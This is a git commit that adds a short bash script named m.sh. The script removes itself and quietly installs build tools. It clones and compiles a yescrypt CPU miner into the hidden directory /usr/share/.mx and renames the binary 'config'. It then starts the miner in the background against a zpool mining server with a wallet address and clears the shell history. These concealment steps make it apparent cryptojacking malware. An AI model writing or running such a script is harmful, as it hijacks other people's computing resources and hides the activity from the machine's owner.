7ac13484ff326c80596684427d822982c67de787
rr1337 <45742441+rr1337@users.noreply.github.com>
2018-12-09 19:53:55 -0200

    Create m.sh

---
+++ m.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+rm m.sh
+apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y > /dev/null
+apt-get install make git nano autoconf automake -y > /dev/null
+git clone https://github.com/noncepool/cpuminer-yescrypt.git /usr/share/.mx > /dev/null
+cd /usr/.mx
+./autogen.sh
+./configure CFLAGS="-O3"
+make
+mv minerd config
+nohup ./config -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Loch2rNJWp3eNgUjiZaa92nZvQyP9pT6F &
+history -c
